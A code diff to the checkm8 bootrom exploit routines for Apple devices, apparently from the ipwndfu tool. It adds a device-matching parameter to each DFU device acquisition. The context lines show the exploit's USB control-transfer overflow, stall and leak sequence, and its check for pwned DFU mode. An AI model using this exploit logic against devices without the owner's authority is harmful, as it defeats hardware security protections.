@@ -626,10 +626,10 @@ def exploit_config(serial_number):
     sys.exit(1)
 
 
-def exploit():
+def exploit(match=None):
     print('*** checkm8 exploit by axi0mX ***')
 
-    device = dfu.acquire_device()
+    device = dfu.acquire_device(match=match)
     start = time.time()
     print('Found:', device.serial_number)
     if 'PWND:[' in device.serial_number:
@@ -651,7 +651,7 @@ def exploit():
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device()
+    device = dfu.acquire_device(match=match)
     device.serial_number
     libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
 
@@ -662,7 +662,7 @@ def exploit():
 
     time.sleep(0.8)
 
-    device = dfu.acquire_device()
+    device = dfu.acquire_device(match=match)
     usb_req_stall(device)
     if config.large_leak is not None:
         usb_req_leak(device)
@@ -675,7 +675,7 @@ def exploit():
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device()
+    device = dfu.acquire_device(match=match)
     if 'PWND:[checkm8]' not in device.serial_number:
         print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
         sys.exit(1)
@@ -683,10 +683,10 @@ def exploit():
     print('(%0.2f seconds)' % (time.time() - start))
     dfu.release_device(device)
 
-def exploit_a8_a9():
+def exploit_a8_a9(match=None):
   print('*** checkm8 exploit by axi0mX ***')
 
-  device = dfu.acquire_device()
+  device = dfu.acquire_device(match=match)
   start = time.time()
   print('Found:', device.serial_number)
   if 'PWND:[' in device.serial_number:
@@ -707,7 +707,7 @@ def exploit_a8_a9():
   dfu.usb_reset(device)
   dfu.release_device(device)
 
-  device = dfu.acquire_device()
+  device = dfu.acquire_device(match=match)
   device.serial_number
   libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
   libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * padding, 10)
@@ -716,7 +716,7 @@ def exploit_a8_a9():
 
   time.sleep(0.5)
 
-  device = dfu.acquire_device()
+  device = dfu.acquire_device(match=match)
   usb_req_stall(device)
   usb_req_leak(device)
   usb_req_leak(device)
@@ -727,7 +727,7 @@ def exploit_a8_a9():
   dfu.usb_reset(device)
   dfu.release_device(device)
 
-  device = dfu.acquire_device()
+  device = dfu.acquire_device(match=match)
   if 'PWND:[checkm8]' not in device.serial_number:
     print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
     sys.exit(1)
